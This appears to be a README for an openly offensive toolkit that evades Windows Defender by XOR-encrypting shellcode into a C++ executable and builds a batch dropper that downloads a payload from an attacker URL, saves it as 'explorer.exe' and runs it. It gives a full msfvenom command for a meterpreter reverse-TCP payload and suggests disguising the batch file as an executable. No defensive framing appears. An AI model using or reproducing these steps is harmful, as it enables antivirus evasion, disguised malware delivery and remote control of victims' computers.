# windows defender bypass with c++ and batchscript

required mingw32-g++ and python installed on your os.

help <windefbyp.py>:
```
options:
  -h, --help         show this help message and exit
  -p <payload.bin>   payload file path, ex: ./payload.bin
  -o <output.cpp>    output file (.cpp extension), ex: ./output.cpp
  -e <exe_file.exe>  exe output file (.exe extension), ex: exe_file.exe
```

usage <windefbyp.py>:
```
windefbyp.py [-h] -p <payload.bin> -o <output.cpp> -e <exe_file.exe>
```

help <need2bat.py>:
```
options:
  -h, --help         show this help message and exit
  -u [http://url]    payload file url, ex: http://192.168.1.5:8080/payload.exe
  -d <explorer.exe>  output file name for downloading, ex: explorer.exe (.exe extension)
  -o <output.bat>    output file name, ex: output.bat (.bat extension)
```

usage <need2bat.py>:
```
need2bat.py [-h] -u [http://url] -d <explorer.exe> -o <output.bat>
```

# hint:

- encrypt the output .bat file and convert it to exe (;
  
- use this command to make <payload.bin> file (must be installed metasploit):
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ur_ip lport=ur_port -f raw > ./payload.bin
```

# info:

windefbyp.py: windows defender bypass with xor encryption

need2bat.py: create a .bat file that download the payload file from via http and run it via cmd

source.cpp: source file for windefbyp.py

source.bat: source file for need2bat.py

dm on telegram: @TSuNAmi_ORg

# screenshot:
![](https://github.com/tsunami0x/windefbyp/blob/main/screenshot.gif)
